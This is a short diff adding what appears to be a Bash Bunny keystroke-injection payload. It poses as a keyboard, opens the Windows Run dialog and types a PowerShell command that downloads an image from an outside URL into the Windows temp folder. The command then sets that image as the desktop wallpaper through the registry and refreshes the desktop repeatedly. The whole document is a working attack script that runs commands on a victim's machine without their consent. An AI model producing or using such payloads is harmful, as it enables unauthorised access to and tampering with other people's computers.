@@ -1,0 +1,11 @@
+LED SETUP
+ATTACKMODE HID
+LED ATTACK
+Q GUI r
+Q DELAY 600
+Q STRING "powershell"
+Q ENTER
+Q DELAY 2000
+Q STRING "iwr -Uri [URL]/doom.jpg -OutFile 'c:\windows\temp\doom.jpg'; Set-ItemProperty -path 'HKCU:\Control Panel\Desktop\' -name wallpaper -value 'c:\windows\temp\doom.jpg' ; 1..20|%{RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;sleep 1}; exit"
+Q ENTER
+LED G
